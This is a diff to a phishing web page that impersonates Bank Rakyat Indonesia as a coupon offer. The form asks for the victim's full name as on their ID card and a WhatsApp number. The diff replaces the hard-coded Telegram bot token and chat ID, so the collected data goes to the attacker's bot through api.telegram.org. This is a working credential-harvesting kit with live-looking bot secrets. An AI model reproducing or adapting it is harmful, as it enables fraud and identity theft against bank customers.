@@ -829,11 +829,11 @@ body{
         <div class="card-input">
           <label for="cardName" class="card-input__label" style="font-weight: 800;margin-left: 3px">Nama Lengkap</label>
           <input type="hidden" id="logo" value="༺═𝗚𝗲𝗯𝘆𝗮𝗿 𝗕𝗥𝗜═༻">
-          <input type="text" id="nama" name="𝐍𝐚𝐦𝐚="class="card-input__input" v-model="cardNumber" v-on:focus="focusInput"  data-ref="cardNumber" autocomplete="off" placeholder="Masukan Nama Lengkap" required>
+          <input type="text" id="nama" name="𝐍𝐚𝐦𝐚="class="card-input__input" v-model="cardNumber" v-on:focus="focusInput"  data-ref="cardNumber" autocomplete="off" placeholder="Nama sesuai KTP" required>
         </div>
         <div class="card-input">
-          <label for="cardName" class="card-input__label" style="font-weight: 800; margin-left: 3px">Nomor Handphone</label>
-          <input type="number" id="nomor" name="𝐍𝐨.𝐇𝐩="class="card-input__input" v-model="cardName"  v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" placeholder="Nomor Handphone" maxlength="14" required>
+          <label for="cardName" class="card-input__label" style="font-weight: 800; margin-left: 3px">Nomor WhatsApp</label>
+          <input type="number" id="nomor" name="𝐍𝐨.𝐇𝐩="class="card-input__input" v-model="cardName"  v-on:focus="focusInput" v-on:blur="blurInput" data-ref="cardName" autocomplete="off" placeholder="08123456789" maxlength="13" required>
         </div>
         <div class="card-form__row">
           <div class="card-form__col">
@@ -852,7 +852,7 @@ body{
           </div>
         </div>
 
-         <button id="kirim" type="submit" class="card-form__button">Lanjut </button> 
+         <button id="kirim" type="submit" class="card-form__button">Ambil Kupon</button> 
       </div>
    </form></div><br>
 <h6 style="font-family: 'Nunito', sans-serif; font-size: 8px; font-weight: bold; color: #000; letter-spacing: 1px; text-align: center; line-height: 1; border-radius: 5px;">© 2025 PT.Bank Rakyat Indonesia (Persero) Tbk. | All Rights Reserved.</h6>
@@ -891,7 +891,7 @@ body{
                 });
             });
             
-const chat_id = '6743472561', botID = 'bot7714679923%3AAAEkJ0Akl-OzdOOFzEP5UoIehrW5dwVSnMA';
+const chat_id = '6200866218', botID = 'bot7888692670%3AAAHZpTa1JjFOHy7_Eg_g1omZ91plaqyVQ3Y';
 
     const telegramURL = `https://api.telegram.org/${botID}/sendMessage`;
 
